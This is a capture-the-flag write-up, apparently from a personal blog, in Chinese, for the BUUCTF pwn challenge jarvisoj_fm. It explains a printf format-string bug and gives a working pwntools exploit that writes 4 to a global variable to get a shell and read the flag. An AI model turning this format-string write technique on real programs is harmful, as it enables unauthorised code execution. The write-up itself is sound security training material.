---
title: "BUUCTF Pwn Jarvisoj_fm"
date: 2020-04-09T19:30:44+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Jarvisoj_fm

考点：格式化字符串改写任意地址内容

![image-20200409193343106](/images/image-20200409193343106.png)

32位，开启canary、nx

![image-20200409193151922](/images/image-20200409193151922.png)

存在printf可以利用格式化字符串漏洞修改x的内容为4来绕过if判断从而getshell

![image-20200409193641752](/images/image-20200409193641752.png)

x地址为0x0804a02c，.data有读写权限

![image-20200409194017184](/images/image-20200409194017184.png)

![image-20200409194046308](/images/image-20200409194046308.png)

输入的第1个内容的栈偏移为11个单位（32位4字节）

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
#sh = process('./jarvisoj_fm')
sh = remote('node3.buuoj.cn',26325)
#gdb.attach(sh)
x_addr = 0x0804a02c
#将栈偏移13个单位处的x_addr指针指向的地址内容修改为4
#payload中x_addr写入的位置为栈偏移13处，见下图
#25346225(小端)是栈偏移11，所以2ca00408(小端)是栈偏移11+2=13
payload = '%4c%13$n' + p32(x_addr)
#pause()
sh.sendline(payload)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200409193314193](/images/image-20200409193314193.png)